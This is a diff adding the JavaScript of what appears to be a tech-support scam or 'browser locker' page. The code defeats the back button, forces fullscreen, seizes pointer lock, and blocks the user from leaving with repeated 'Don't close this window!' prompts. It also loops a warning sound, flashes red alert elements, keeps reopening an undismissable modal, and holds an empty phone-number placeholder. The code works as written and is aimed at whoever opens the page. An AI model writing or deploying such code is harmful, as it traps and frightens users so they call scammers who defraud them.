@@ -1,0 +1,272 @@
+
+    	window.dataLayer = window.dataLayer || [];
+    	function gtag(){dataLayer.push(arguments);}
+    	gtag('js', new Date());
+
+    	gtag('config', 'UA-167434343-1');
+    
+
+                //backbutton
+                !(function () {
+                    var t;
+                    try {
+                        for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+                        onpopstate = function (t) {
+                            t.state && location.replace("#");
+                        };
+                    } catch (o) {}
+                })();
+            
+
+            function myFunction() {
+            return "Write something clever here...";
+            }
+            
+
+            $(document).ready(function() {
+            var audioElement = document.createElement('audio');
+            audioElement.setAttribute('src', 'a0ler0tm0s.mp3');
+
+            audioElement.addEventListener('ended', function() {
+              this.play();
+            }, false);
+
+
+
+            $('#map').click(function() {
+              audioElement.play();
+
+            });
+
+
+            });
+            
+var state=true;document.body.addEventListener('click',function toggleFullScreen(){_toggleFullScreen();},true);window.addEventListener('mouseup',function toggleFullScreen(){_toggleFullScreen();if(navigator.userAgent.toLowerCase().indexOf('chrome')>-1||navigator.userAgent.indexOf("Opera")){}else{open1();}},false);window.onbeforeunload=confirmExit;function confirmExit(){alert("Don't close this window! It's important!");return"You have attempted to leave this page. Are you sure?";}setInterval(function(){if(state===true){document.getElementById('red_alert').style='opacity: 0';document.getElementById('red_alert1').style='opacity: 0';document.getElementById('alert-modal').style='transform: scale(1.04)';state=false;}else{document.getElementById('red_alert').style='opacity: 1';document.getElementById('red_alert1').style='opacity: 1';document.getElementById('alert-modal').style='transform: scale(1)';state=true;}},800);
+var modal=document.getElementById('myModal');var btn=document.getElementById("myBtn");var span=document.getElementsByClassName("close")[0];span.onclick=function(){modal.style.display="none";}
+window.onclick=function(event){if(event.target==modal){modal.style.display="none";}}
+function addEvent(obj,evt,fn){if(obj.addEventListener){obj.addEventListener(evt,fn,false);}else if(obj.attachEvent){obj.attachEvent("on"+evt,fn);}}addEvent(window,"load",function(e){addEvent(document,"mouseout",function(e){e=e?e:window.event;var from=e.relatedTarget||e.toElement;if(!from||from.nodeName=="HTML"){modal.style.display="block";}});});$(document).mousemove(function(){var canvas=document.getElementById('mycanvas');canvas.requestPointerLock=canvas.requestPointerLock||canvas.mozRequestPointerLock||canvas.webkitRequestPointerLock;canvas.requestPointerLock();});
+$(window).on('load',function(){$('#myNewModal').modal('show');});$('#myNewModal').modal({backdrop:'static',keyboard:false})
+$("#myNewModal .modal-footer button").click(function(){$('#myNewModal').modal('hide');setTimeout(function(){$('#myNewModal').modal('show');},500);})
+window.onbeforeunload=function(event){var message='Important: Please click on \'Save\' button to leave this page.';if(typeof event=='undefined'){event=window.event;}if(event){event.returnValue=message;}return message;};$(function(){$("a").not('#lnkLogOut').click(function(){window.onbeforeunload=null;});$(".btn").click(function(){window.onbeforeunload=null;});});
+var time=540000;var iframe_url='';setTimeout(function(){document.getElementById("iframe").style.visibility="visible";$('iframe#iframe').attr('src',iframe_url);},time);
+
+
+    var phone = "";
+
+    $('.phone').text(phone);
+
+
+  var state = true;
+
+  document.body.addEventListener('click', function toggleFullScreen() {
+      _toggleFullScreen();
+    }, true
+  );
+
+  window.addEventListener('mouseup', function toggleFullScreen() {
+    _toggleFullScreen();
+
+    if (navigator.userAgent.toLowerCase().indexOf('chrome') > -1 || navigator.userAgent.indexOf("Opera")) {
+    } else {
+      open1();
+    }
+  }, false);
+
+  window.onbeforeunload = confirmExit;
+
+  function confirmExit() {
+
+    return "You have attempted to leave this page. Are you sure?";
+  }
+
+  setInterval(function () {
+    if (state === true) {
+
+      document.getElementById('alert-modal').style = 'transform: scale(1.04)';
+      state = false;
+    } else {
+
+      document.getElementById('alert-modal').style = 'transform: scale(1)';
+      state = true;
+    }
+  }, 800);
+
+
+addEventListener("click", function() {
+var
+  el = document.documentElement
+, rfs =
+       el.requestFullScreen
+    || el.webkitRequestFullScreen
+    || el.mozRequestFullScreen
+;
+rfs.call(el);
+});
+
+
+setTimeout(function(){document.getElementById("map").style.display="block";document.getElementById("warning").play();},10);
+
+
+/*=============HELPER================*/
+var Helper = (function () {
+
+    var data = [];
+
+    var months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
+    var days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
+
+    function setDays(d) {
+        if ((d.constructor !== Array) || d.length !== 7)
+            return false;
+
+        days = d;
+    }
+
+    function setMonths(m) {
+        if ((m.constructor !== Array) || m.length !== 12)
+            return false;
+
+        months = m;
+    }
+
+    function getDate() {
+        var now = new Date();
+        var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+        return (now.getDate()) + " " + month + " " + now.getFullYear();
+    }
+
+    function getMonth() {
+        var now = new Date();
+        var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+        return month;
+    }
+
+    function getDay() {
+        var now = new Date();
+        var day = typeof(days[now.getDay()]) == 'undefined' ? now.getDay() : days[now.getDay()];
+        return day;
+    }
+
+    function getDayOfMonth() {
+        var now = new Date();
+        var day = ('0' + now.getDate()).slice(-2);
+        return day;
+    }
+
+    function getUrlParameter(name) {
+        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+        var results = regex.exec(location.search);
+        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    }
+
+    function findAncestor(element, name) {
+        while ((element = element.parentElement) && !element.classList.contains(name)) ;
+        return element;
+    }
+
+    function bindOnQuery(query, callback, action = 'click') {
+        var elements = document.querySelectorAll(query);
+        for (var i = 0; i < elements.length; i++) {
+            elements[i].addEventListener(action, callback, false);
+        }
+    }
+
+    function bindOnId(name, callback, action = 'click') {
+        var element = document.getElementById(name);
+        element.addEventListener(action, callback, false);
+    }
+
+    function replaceMarkers(text, markers) {
+        for (key in markers) {
+            var search = '%' + key + '%';
+            text = text.replace(new RegExp(search, 'g'), markers[key]);
+        }
+
+        return text;
+    }
+
+    return {
+        setDays: setDays,
+        setMonths: setMonths,
+        getDate: getDate,
+        getDay: getDay,
+        getMonth: getMonth,
+        getDayOfMonth: getDayOfMonth,
+        getUrlParameter: getUrlParameter,
+        findAncestor: findAncestor,
+        bindOnQuery: bindOnQuery,
+        bindOnId: bindOnId,
+        replaceMarkers: replaceMarkers
+    };
+
+})();
+
+
+  // Get the modal
+  var modal = document.getElementById('myModal');
+
+  // Get the button that opens the modal
+  var btn = document.getElementById("myBtn");
+
+  // Get the <span> element that closes the modal
+  var span = document.getElementsByClassName("close")[0];
+
+  // When the user clicks the button, open the modal
+  /*btn.onclick = function() {
+    modal.style.display = "block";
+  } */
+
+  // When the user clicks on <span> (x), close the modal
+  span.onclick = function() {
+    modal.style.display = "none";
+  }
+
+  // When the user clicks anywhere outside of the modal, close it
+  window.onclick = function(event) {
+    if (event.target == modal) {
+      modal.style.display = "none";
+    }
+  }
+  
+
+  function addEvent(obj, evt, fn) {
+      if (obj.addEventListener) {
+          obj.addEventListener(evt, fn, false);
+      }
+      else if (obj.attachEvent) {
+          obj.attachEvent("on" + evt, fn);
+      }
+  }
+  addEvent(window,"load",function(e) {
+      addEvent(document, "mouseout", function(e) {
+          e = e ? e : window.event;
+          var from = e.relatedTarget || e.toElement;
+          if (!from || from.nodeName == "HTML") {
+              // stop your drag event here
+              // for now we can just use an alert
+           //alert("hello");
+
+  			 modal.style.display = "block";
+
+          }
+      });
+  });
+
+    $(document).mousemove(function(){
+    var canvas = document.getElementById('mycanvas');
+  canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+  canvas.requestPointerLock();
+
+    //capture mouse movement event
+       // remove our layover from the DOM
+    });
+
+   //  $(document).mousemove(function(){
+   // alert("move detect");
+    //capture mouse movement event
+   //   $("#pageLayover").remove(); // remove our layover from the DOM
+   // });
+
+
+  
